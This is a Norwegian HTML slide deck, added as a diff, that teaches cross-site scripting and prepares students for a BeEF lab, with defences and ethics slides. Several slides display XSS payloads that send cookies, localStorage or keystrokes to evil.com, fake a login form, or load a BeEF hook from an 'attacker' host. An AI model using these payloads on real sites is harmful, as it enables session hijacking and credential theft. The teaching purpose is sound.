@@ -1,0 +1,786 @@
+<!DOCTYPE html>
+<html lang="no">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cross Site Scripting (XSS) - Sikkerhetspresentasjon</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .presentation-container {
+            background: white;
+            border-radius: 15px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+            width: 100%;
+            max-width: 1200px;
+            height: 80vh;
+            overflow: hidden;
+            position: relative;
+        }
+
+        .slide {
+            display: none;
+            padding: 60px;
+            height: calc(80vh - 80px);
+            overflow-y: auto;
+            animation: slideIn 0.5s ease-in-out;
+        }
+
+        .slide.active {
+            display: block;
+        }
+
+        @keyframes slideIn {
+            from {
+                opacity: 0;
+                transform: translateX(30px);
+            }
+            to {
+                opacity: 1;
+                transform: translateX(0);
+            }
+        }
+
+        .slide h1 {
+            color: #764ba2;
+            font-size: 3em;
+            margin-bottom: 30px;
+            text-align: center;
+            border-bottom: 3px solid #667eea;
+            padding-bottom: 20px;
+        }
+
+        .slide h2 {
+            color: #667eea;
+            font-size: 2.2em;
+            margin-bottom: 25px;
+            margin-top: 30px;
+        }
+
+        .slide h3 {
+            color: #764ba2;
+            font-size: 1.6em;
+            margin-bottom: 15px;
+            margin-top: 25px;
+        }
+
+        .slide p, .slide li {
+            font-size: 1.2em;
+            line-height: 1.8;
+            color: #333;
+            margin-bottom: 15px;
+        }
+
+        .slide ul {
+            margin-left: 30px;
+            margin-bottom: 20px;
+        }
+
+        .code-example {
+            background: #2d2d2d;
+            color: #f8f8f2;
+            padding: 20px;
+            border-radius: 8px;
+            margin: 20px 0;
+            font-family: 'Courier New', monospace;
+            overflow-x: auto;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+        }
+
+        .code-example .comment {
+            color: #6272a4;
+        }
+
+        .code-example .string {
+            color: #f1fa8c;
+        }
+
+        .code-example .keyword {
+            color: #ff79c6;
+        }
+
+        .warning-box {
+            background: #fff3cd;
+            border-left: 5px solid #ffc107;
+            padding: 15px;
+            margin: 20px 0;
+            border-radius: 5px;
+        }
+
+        .success-box {
+            background: #d4edda;
+            border-left: 5px solid #28a745;
+            padding: 15px;
+            margin: 20px 0;
+            border-radius: 5px;
+        }
+
+        .danger-box {
+            background: #f8d7da;
+            border-left: 5px solid #dc3545;
+            padding: 15px;
+            margin: 20px 0;
+            border-radius: 5px;
+        }
+
+        .navigation {
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            background: #f8f9fa;
+            padding: 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-top: 2px solid #dee2e6;
+        }
+
+        .nav-button {
+            background: #667eea;
+            color: white;
+            border: none;
+            padding: 10px 25px;
+            border-radius: 25px;
+            cursor: pointer;
+            font-size: 1.1em;
+            transition: all 0.3s ease;
+        }
+
+        .nav-button:hover {
+            background: #764ba2;
+            transform: translateY(-2px);
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+        }
+
+        .nav-button:disabled {
+            background: #ccc;
+            cursor: not-allowed;
+        }
+
+        .slide-counter {
+            font-size: 1.1em;
+            color: #666;
+            font-weight: bold;
+        }
+
+        .diagram {
+            background: #f8f9fa;
+            border: 2px solid #dee2e6;
+            border-radius: 10px;
+            padding: 30px;
+            margin: 20px 0;
+            text-align: center;
+        }
+
+        .flow-arrow {
+            font-size: 2em;
+            color: #667eea;
+            margin: 10px 0;
+        }
+
+        .intro-slide {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            text-align: center;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .intro-slide h1 {
+            color: white;
+            border-bottom: 3px solid white;
+            font-size: 4em;
+        }
+
+        .intro-slide p {
+            color: white;
+            font-size: 1.5em;
+        }
+
+        .xss-types {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 20px;
+            margin: 20px 0;
+        }
+
+        .xss-type-card {
+            background: #f8f9fa;
+            border-radius: 10px;
+            padding: 20px;
+            border-left: 5px solid #667eea;
+            transition: transform 0.3s ease;
+        }
+
+        .xss-type-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 8px 16px rgba(0, 0, 0, 0.1);
+        }
+
+        .beef-info {
+            background: linear-gradient(135deg, #2d2d2d, #1a1a1a);
+            color: white;
+            padding: 30px;
+            border-radius: 10px;
+            margin: 20px 0;
+        }
+
+        .beef-info h3 {
+            color: #ffc107;
+        }
+
+        .beef-info p, .beef-info li {
+            color: #f8f8f2;
+        }
+    </style>
+</head>
+<body>
+    <div class="presentation-container">
+        <!-- Slide 1: Introduksjon -->
+        <div class="slide active intro-slide">
+            <h1>Cross Site Scripting (XSS)</h1>
+            <p>En kritisk sikkerhetsutfordring i moderne webapplikasjoner</p>
+            <br><br>
+            <p style="font-size: 1.2em;">📚 Tell & Show - Forberedelse til praktisk lab</p>
+            <p style="font-size: 1em; margin-top: 20px;">Kali Linux & BeEF Framework</p>
+        </div>
+
+        <!-- Slide 2: Hva er XSS? -->
+        <div class="slide">
+            <h1>Hva er Cross Site Scripting?</h1>
+            
+            <h2>Definisjon</h2>
+            <p>Cross Site Scripting (XSS) er en type sikkerhetssvakhet som lar angripere injisere ondsinnet klient-side kode (vanligvis JavaScript) i webapplikasjoner som andre brukere ser.</p>
+            
+            <div class="danger-box">
+                <strong>⚠️ Alvorlighetsgrad:</strong> XSS er rangert som #2 på OWASP Top 10 (2021) under "Injection" kategorien
+            </div>
+            
+            <h3>Hvorfor er XSS farlig?</h3>
+            <ul>
+                <li>Stjele sesjons-cookies og overta brukerkontoer</li>
+                <li>Omdirigere brukere til ondsinnede nettsteder</li>
+                <li>Endre innholdet på websiden (defacement)</li>
+                <li>Stjele sensitive data fra brukerens nettleser</li>
+                <li>Utføre handlinger på vegne av offeret</li>
+            </ul>
+        </div>
+
+        <!-- Slide 3: Hvordan fungerer XSS? -->
+        <div class="slide">
+            <h1>Hvordan fungerer XSS?</h1>
+            
+            <div class="diagram">
+                <h3>Angrepsflyt</h3>
+                <p><strong>1. Angriper</strong></p>
+                <div class="flow-arrow">↓</div>
+                <p>Injiserer ondsinnet script</p>
+                <div class="flow-arrow">↓</div>
+                <p><strong>2. Sårbar Webapplikasjon</strong></p>
+                <div class="flow-arrow">↓</div>
+                <p>Lagrer/reflekterer scriptet uten validering</p>
+                <div class="flow-arrow">↓</div>
+                <p><strong>3. Offer</strong></p>
+                <div class="flow-arrow">↓</div>
+                <p>Nettleseren kjører det ondsinnede scriptet</p>
+            </div>
+            
+            <h3>Grunnleggende forutsetninger:</h3>
+            <ul>
+                <li>Applikasjonen tar imot brukerinput</li>
+                <li>Input blir ikke validert eller escaped korrekt</li>
+                <li>Input blir vist tilbake til brukere i nettleseren</li>
+            </ul>
+        </div>
+
+        <!-- Slide 4: De tre typene XSS -->
+        <div class="slide">
+            <h1>De tre hovedtypene XSS</h1>
+            
+            <div class="xss-types">
+                <div class="xss-type-card">
+                    <h3>1. Reflected XSS</h3>
+                    <p><strong>Ikke-persistent</strong></p>
+                    <p>Scriptet kommer fra den aktuelle HTTP-forespørselen</p>
+                    <p>Vanligvis via URL-parametere eller skjemadata</p>
+                    <p>Krever at offeret klikker på en spesiallagd lenke</p>
+                </div>
+                
+                <div class="xss-type-card">
+                    <h3>2. Stored XSS</h3>
+                    <p><strong>Persistent</strong></p>
+                    <p>Scriptet lagres permanent på serveren</p>
+                    <p>Kjøres hver gang siden lastes</p>
+                    <p>Mest alvorlig - påvirker alle brukere</p>
+                </div>
+                
+                <div class="xss-type-card">
+                    <h3>3. DOM-based XSS</h3>
+                    <p><strong>Klient-side</strong></p>
+                    <p>Skjer helt i nettleseren</p>
+                    <p>Manipulerer DOM-miljøet</p>
+                    <p>Serveren ser aldri det ondsinnede scriptet</p>
+                </div>
+            </div>
+        </div>
+
+        <!-- Slide 5: Reflected XSS - Dybdedykk -->
+        <div class="slide">
+            <h1>Reflected XSS - Eksempel</h1>
+            
+            <h2>Sårbar kode (PHP):</h2>
+            <div class="code-example">
+                <span class="comment">// Sårbar søkefunksjon</span><br>
+                &lt;?php<br>
+                &nbsp;&nbsp;$søk = $_GET['q'];<br>
+                &nbsp;&nbsp;echo <span class="string">"Du søkte etter: "</span> . $søk;<br>
+                ?&gt;
+            </div>
+            
+            <h2>Angrep:</h2>
+            <div class="code-example">
+                <span class="comment">// Ondsinnet URL:</span><br>
+                http://example.com/search.php?q=<span class="keyword">&lt;script&gt;</span>alert('XSS')<span class="keyword">&lt;/script&gt;</span>
+            </div>
+            
+            <div class="danger-box">
+                <strong>Resultat:</strong> JavaScript-koden kjøres i offerets nettleser når de klikker på lenken!
+            </div>
+            
+            <h3>Mer avansert payload:</h3>
+            <div class="code-example">
+                <span class="keyword">&lt;script&gt;</span><br>
+                &nbsp;&nbsp;<span class="comment">// Stjeler cookies og sender til angriper</span><br>
+                &nbsp;&nbsp;document.location=<span class="string">'http://evil.com/steal.php?cookie='</span>+document.cookie<br>
+                <span class="keyword">&lt;/script&gt;</span>
+            </div>
+        </div>
+
+        <!-- Slide 6: Stored XSS - Dybdedykk -->
+        <div class="slide">
+            <h1>Stored XSS - Eksempel</h1>
+            
+            <h2>Scenario: Kommentarfelt på blogg</h2>
+            
+            <div class="code-example">
+                <span class="comment">// Sårbar kode som lagrer kommentar:</span><br>
+                &lt;?php<br>
+                &nbsp;&nbsp;$kommentar = $_POST['comment'];<br>
+                &nbsp;&nbsp;$sql = <span class="string">"INSERT INTO comments (text) VALUES ('$kommentar')"</span>;<br>
+                &nbsp;&nbsp;mysqli_query($conn, $sql);<br>
+                ?&gt;<br><br>
+                <span class="comment">// Viser kommentarer:</span><br>
+                &lt;?php<br>
+                &nbsp;&nbsp;while($row = mysqli_fetch_assoc($result)) {<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;echo $row['text'];<br>
+                &nbsp;&nbsp;}<br>
+                ?&gt;
+            </div>
+            
+            <h2>Ondsinnet kommentar:</h2>
+            <div class="code-example">
+                Flott artikkel!<span class="keyword">&lt;script&gt;</span>
+                  fetch(<span class="string">'http://evil.com/steal'</span>, {
+                    method: <span class="string">'POST'</span>,
+                    body: JSON.stringify({
+                      cookies: document.cookie,
+                      localStorage: localStorage
+                    })
+                  });
+                <span class="keyword">&lt;/script&gt;</span>
+            </div>
+            
+            <div class="warning-box">
+                <strong>Konsekvens:</strong> ALLE som besøker siden får kjørt scriptet automatisk!
+            </div>
+        </div>
+
+        <!-- Slide 7: DOM-based XSS -->
+        <div class="slide">
+            <h1>DOM-based XSS - Eksempel</h1>
+            
+            <h2>Sårbar JavaScript-kode:</h2>
+            <div class="code-example">
+                <span class="keyword">function</span> showWelcome() {<br>
+                &nbsp;&nbsp;<span class="comment">// Henter navn fra URL</span><br>
+                &nbsp;&nbsp;<span class="keyword">var</span> name = window.location.hash.substring(1);<br>
+                &nbsp;&nbsp;<br>
+                &nbsp;&nbsp;<span class="comment">// Setter direkte inn i DOM - SÅRBART!</span><br>
+                &nbsp;&nbsp;document.getElementById(<span class="string">'welcome'</span>).innerHTML = <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;<span class="string">'Velkommen, '</span> + name + <span class="string">'!'</span>;<br>
+                }
+            </div>
+            
+            <h2>Angreps-URL:</h2>
+            <div class="code-example">
+                http://example.com/welcome.html#<span class="keyword">&lt;img src=x onerror=alert('XSS')&gt;</span>
+            </div>
+            
+            <div class="danger-box">
+                <strong>Viktig:</strong> Serveren ser aldri den ondsinnede koden - alt skjer i nettleseren!
+            </div>
+            
+            <h3>Andre farlige JavaScript-funksjoner:</h3>
+            <ul>
+                <li><code>eval()</code></li>
+                <li><code>document.write()</code></li>
+                <li><code>element.innerHTML</code></li>
+                <li><code>element.outerHTML</code></li>
+            </ul>
+        </div>
+
+        <!-- Slide 8: Konsekvenser -->
+        <div class="slide">
+            <h1>Konsekvenser av XSS-angrep</h1>
+            
+            <h2>Session Hijacking</h2>
+            <div class="code-example">
+                <span class="comment">// Stjeler session cookie</span><br>
+                <span class="keyword">var</span> img = <span class="keyword">new</span> Image();<br>
+                img.src = <span class="string">'http://evil.com/log?cookie='</span> + document.cookie;
+            </div>
+            
+            <h2>Phishing & Social Engineering</h2>
+            <div class="code-example">
+                <span class="comment">// Viser falsk innloggingsskjema</span><br>
+                document.body.innerHTML = <span class="string">'&lt;form action="http://evil.com/phish"&gt;'</span> +<br>
+                &nbsp;&nbsp;<span class="string">'Sesjon utløpt. Logg inn på nytt:&lt;br&gt;'</span> +<br>
+                &nbsp;&nbsp;<span class="string">'&lt;input type="password" name="pass"&gt;'</span> +<br>
+                &nbsp;&nbsp;<span class="string">'&lt;input type="submit"&gt;&lt;/form&gt;'</span>;
+            </div>
+            
+            <h2>Keylogging</h2>
+            <div class="code-example">
+                <span class="comment">// Logger alle tastetrykk</span><br>
+                document.addEventListener(<span class="string">'keypress'</span>, <span class="keyword">function</span>(e) {<br>
+                &nbsp;&nbsp;<span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();<br>
+                &nbsp;&nbsp;xhr.open(<span class="string">'POST'</span>, <span class="string">'http://evil.com/keylog'</span>);<br>
+                &nbsp;&nbsp;xhr.send(e.key);<br>
+                });
+            </div>
+            
+            <div class="warning-box">
+                <strong>Reelle hendelser:</strong> MySpace Samy worm (2005), Twitter worm (2009), British Airways (2018)
+            </div>
+        </div>
+
+        <!-- Slide 9: Beskyttelse -->
+        <div class="slide">
+            <h1>Beskyttelse mot XSS</h1>
+            
+            <h2>1. Input Validering</h2>
+            <div class="success-box">
+                <strong>Whitelist-basert validering:</strong> Tillat kun forventet input
+            </div>
+            <div class="code-example">
+                <span class="comment">// PHP eksempel</span><br>
+                <span class="keyword">if</span> (!preg_match(<span class="string">"/^[a-zA-Z0-9 ]*$/"</span>, $input)) {<br>
+                &nbsp;&nbsp;die(<span class="string">"Ugyldig input"</span>);<br>
+                }
+            </div>
+            
+            <h2>2. Output Encoding/Escaping</h2>
+            <div class="code-example">
+                <span class="comment">// PHP</span><br>
+                echo htmlspecialchars($userInput, ENT_QUOTES, <span class="string">'UTF-8'</span>);<br><br>
+                <span class="comment">// JavaScript</span><br>
+                element.textContent = userInput; <span class="comment">// IKKE innerHTML!</span>
+            </div>
+            
+            <h2>3. Content Security Policy (CSP)</h2>
+            <div class="code-example">
+                <span class="comment">&lt;!-- HTTP Header --&gt;</span><br>
+                Content-Security-Policy: default-src <span class="string">'self'</span>; script-src <span class="string">'self'</span>
+            </div>
+            
+            <h2>4. Bruk sikre rammeverk</h2>
+            <ul>
+                <li>React (auto-escaping)</li>
+                <li>Angular (sanitization)</li>
+                <li>Vue.js (v-text direktiv)</li>
+            </ul>
+        </div>
+
+        <!-- Slide 10: Testing for XSS -->
+        <div class="slide">
+            <h1>Testing for XSS-sårbarheter</h1>
+            
+            <h2>Grunnleggende test-payloads:</h2>
+            <div class="code-example">
+                <span class="comment">// Enkel alert test</span><br>
+                &lt;script&gt;alert('XSS')&lt;/script&gt;<br><br>
+                
+                <span class="comment">// IMG tag med onerror</span><br>
+                &lt;img src=x onerror=alert('XSS')&gt;<br><br>
+                
+                <span class="comment">// SVG payload</span><br>
+                &lt;svg onload=alert('XSS')&gt;<br><br>
+                
+                <span class="comment">// Event handler</span><br>
+                &lt;body onload=alert('XSS')&gt;<br><br>
+                
+                <span class="comment">// JavaScript URL</span><br>
+                &lt;a href="javascript:alert('XSS')"&gt;Klikk&lt;/a&gt;
+            </div>
+            
+            <h2>Kontekst-spesifikke payloads:</h2>
+            <div class="code-example">
+                <span class="comment">// Hvis input er i HTML attributt</span><br>
+                " onmouseover="alert('XSS')"<br><br>
+                
+                <span class="comment">// Hvis input er i JavaScript streng</span><br>
+                '; alert('XSS');//<br><br>
+                
+                <span class="comment">// URL-encoded for GET parametere</span><br>
+                %3Cscript%3Ealert('XSS')%3C/script%3E
+            </div>
+            
+            <div class="warning-box">
+                <strong>Tips:</strong> Bruk nettleserens Developer Tools for å se hvordan input blir behandlet i DOM
+            </div>
+        </div>
+
+        <!-- Slide 11: BeEF Framework Introduksjon -->
+        <div class="slide">
+            <h1>Browser Exploitation Framework (BeEF)</h1>
+            
+            <div class="beef-info">
+                <h3>🥩 Hva er BeEF?</h3>
+                <p>BeEF er et penetrasjonstestingsverktøy som fokuserer på nettleseren som angrepsvector. Det demonstrerer kraften i XSS-angrep i praksis.</p>
+                
+                <h3>Hovedfunksjoner:</h3>
+                <ul>
+                    <li>Hook nettlesere via XSS</li>
+                    <li>Kommando og kontroll over offerets nettleser</li>
+                    <li>Kjøre moduler for informasjonsinnhenting</li>
+                    <li>Social engineering angrep</li>
+                    <li>Nettverksscanning fra offerets perspektiv</li>
+                </ul>
+            </div>
+            
+            <h2>BeEF Hook - Grunnleggende konsept</h2>
+            <div class="code-example">
+                <span class="comment">&lt;!-- BeEF hook injiseres via XSS --&gt;</span><br>
+                &lt;script src=<span class="string">"http://attacker:3000/hook.js"</span>&gt;&lt;/script&gt;
+            </div>
+            
+            <h3>Hva skjer når en nettleser blir "hooked"?</h3>
+            <ol>
+                <li>Hook.js lastes i offerets nettleser</li>
+                <li>Etablerer WebSocket/polling-forbindelse til BeEF-server</li>
+                <li>Angriper får full kontroll via BeEF admin panel</li>
+                <li>Kan kjøre kommandoer så lenge offeret er på siden</li>
+            </ol>
+        </div>
+
+        <!-- Slide 12: Lab Forberedelse -->
+        <div class="slide">
+            <h1>Forberedelse til Lab-øvelse</h1>
+            
+            <h2>🧪 Hva dere skal gjøre i lab:</h2>
+            
+            <div class="success-box">
+                <h3>Del 1: Oppsett av miljø</h3>
+                <ul>
+                    <li>Starte Kali Linux</li>
+                    <li>Konfigurere BeEF Framework</li>
+                    <li>Sette opp sårbar test-applikasjon (DVWA/WebGoat)</li>
+                </ul>
+            </div>
+            
+            <div class="success-box">
+                <h3>Del 2: Identifisere sårbarheter</h3>
+                <ul>
+                    <li>Teste ulike input-felt for XSS</li>
+                    <li>Identifisere type XSS (Reflected/Stored/DOM)</li>
+                    <li>Dokumentere sårbare punkter</li>
+                </ul>
+            </div>
+            
+            <div class="success-box">
+                <h3>Del 3: Eksploitere med BeEF</h3>
+                <ul>
+                    <li>Injisere BeEF hook via XSS</li>
+                    <li>Utforske BeEF admin interface</li>
+                    <li>Kjøre utvalgte moduler</li>
+                    <li>Observere resultater</li>
+                </ul>
+            </div>
+            
+            <div class="warning-box">
+                <strong>⚠️ VIKTIG:</strong> Alt arbeid skal kun gjøres i isolert lab-miljø! Aldri test på ekte systemer uten skriftlig tillatelse.
+            </div>
+        </div>
+
+        <!-- Slide 13: Etisk hacking og ansvar -->
+        <div class="slide">
+            <h1>Etisk Ansvar & Beste Praksis</h1>
+            
+            <h2>🛡️ Etiske Retningslinjer</h2>
+            <ul>
+                <li><strong>Alltid ha tillatelse:</strong> Aldri test på systemer du ikke eier eller har skriftlig tillatelse til å teste</li>
+                <li><strong>Responsible Disclosure:</strong> Rapporter sårbarheter til eiere på ansvarlig måte</li>
+                <li><strong>Konfidensialitet:</strong> Beskytt sensitive data du måtte komme over</li>
+                <li><strong>Dokumentasjon:</strong> Før nøyaktige logger over alle tester</li>
+            </ul>
+            
+            <h2>📋 Sjekkliste for sikker koding</h2>
+            <div class="success-box">
+                <ul>
+                    <li>✅ Valider ALL brukerinput</li>
+                    <li>✅ Escape output basert på kontekst</li>
+                    <li>✅ Implementer Content Security Policy</li>
+                    <li>✅ Bruk HTTPOnly flag på cookies</li>
+                    <li>✅ Hold rammeverk og biblioteker oppdatert</li>
+                    <li>✅ Utfør regelmessige sikkerhetstester</li>
+                    <li>✅ Tren utviklere i sikker koding</li>
+                </ul>
+            </div>
+            
+            <div class="danger-box">
+                <strong>Husk:</strong> Som IT-profesjonelle har vi ansvar for å beskytte brukeres data og personvern!
+            </div>
+        </div>
+
+        <!-- Slide 14: Ressurser -->
+        <div class="slide">
+            <h1>Videre Ressurser</h1>
+            
+            <h2>📚 Anbefalte Ressurser</h2>
+            
+            <h3>Offisiell Dokumentasjon:</h3>
+            <ul>
+                <li>OWASP XSS Prevention Cheat Sheet</li>
+                <li>OWASP Testing Guide v4</li>
+                <li>BeEF Project Wiki</li>
+                <li>PortSwigger Web Security Academy</li>
+            </ul>
+            
+            <h3>Øvingsmiljøer:</h3>
+            <ul>
+                <li><strong>DVWA</strong> - Damn Vulnerable Web Application</li>
+                <li><strong>WebGoat</strong> - OWASP WebGoat Project</li>
+                <li><strong>bWAPP</strong> - Buggy Web Application</li>
+                <li><strong>Juice Shop</strong> - OWASP Juice Shop</li>
+                <li><strong>XSS Game</strong> - Google's XSS learning game</li>
+            </ul>
+            
+            <h3>Verktøy for testing:</h3>
+            <ul>
+                <li>Burp Suite</li>
+                <li>OWASP ZAP</li>
+                <li>XSSer</li>
+                <li>BeEF</li>
+                <li>Browser Developer Tools</li>
+            </ul>
+            
+            <div class="success-box">
+                <strong>Lab-oppgave:</strong> Start med DVWA på "Low" security level, deretter gradvis øk vanskelighetsgraden
+            </div>
+        </div>
+
+        <!-- Slide 15: Oppsummering -->
+        <div class="slide">
+            <h1>Oppsummering</h1>
+            
+            <h2>🎯 Hovedpunkter</h2>
+            
+            <div class="xss-type-card">
+                <h3>XSS er en kritisk trussel</h3>
+                <p>Rangert høyt på OWASP Top 10, kan føre til fullstendig kompromittering av brukerkontoer</p>
+            </div>
+            
+            <div class="xss-type-card">
+                <h3>Tre hovedtyper</h3>
+                <p>Reflected (ikke-persistent), Stored (persistent), og DOM-based (klient-side)</p>
+            </div>
+            
+            <div class="xss-type-card">
+                <h3>Forsvar på flere lag</h3>
+                <p>Input-validering + Output-encoding + CSP + Sikre rammeverk</p>
+            </div>
+            
+            <div class="xss-type-card">
+                <h3>Testing er essensielt</h3>
+                <p>Bruk verktøy som BeEF for å forstå og demonstrere konsekvenser</p>
+            </div>
+            
+            <h2>🚀 Neste steg: Praktisk Lab</h2>
+            <div class="success-box">
+                <strong>DO & APPLY:</strong> Nå skal dere få hands-on erfaring med å identifisere og utnytte XSS-sårbarheter i kontrollert miljø med Kali Linux og BeEF!
+            </div>
+            
+            <h3 style="text-align: center; color: #667eea; margin-top: 30px;">Lykke til med lab-øvelsen! 🔒</h3>
+        </div>
+
+        <!-- Navigation -->
+        <div class="navigation">
+            <button class="nav-button" id="prevBtn" onclick="changeSlide(-1)">⬅ Forrige</button>
+            <span class="slide-counter" id="slideCounter">1 / 15</span>
+            <button class="nav-button" id="nextBtn" onclick="changeSlide(1)">Neste ➡</button>
+        </div>
+    </div>
+
+    <script>
+        let currentSlide = 1;
+        const totalSlides = 15;
+
+        function showSlide(n) {
+            const slides = document.getElementsByClassName('slide');
+            
+            if (n > totalSlides) {
+                currentSlide = totalSlides;
+            }
+            if (n < 1) {
+                currentSlide = 1;
+            }
+            
+            for (let i = 0; i < slides.length; i++) {
+                slides[i].classList.remove('active');
+            }
+            
+            slides[currentSlide - 1].classList.add('active');
+            
+            document.getElementById('slideCounter').textContent = currentSlide + ' / ' + totalSlides;
+            
+            // Disable/enable navigation buttons
+            document.getElementById('prevBtn').disabled = currentSlide === 1;
+            document.getElementById('nextBtn').disabled = currentSlide === totalSlides;
+        }
+
+        function changeSlide(n) {
+            currentSlide += n;
+            showSlide(currentSlide);
+        }
+
+        // Keyboard navigation
+        document.addEventListener('keydown', function(e) {
+            if (e.key === 'ArrowLeft') {
+                changeSlide(-1);
+            } else if (e.key === 'ArrowRight') {
+                changeSlide(1);
+            }
+        });
+
+        // Initialize
+        showSlide(currentSlide);
+    </script>
+</body>
+</html>
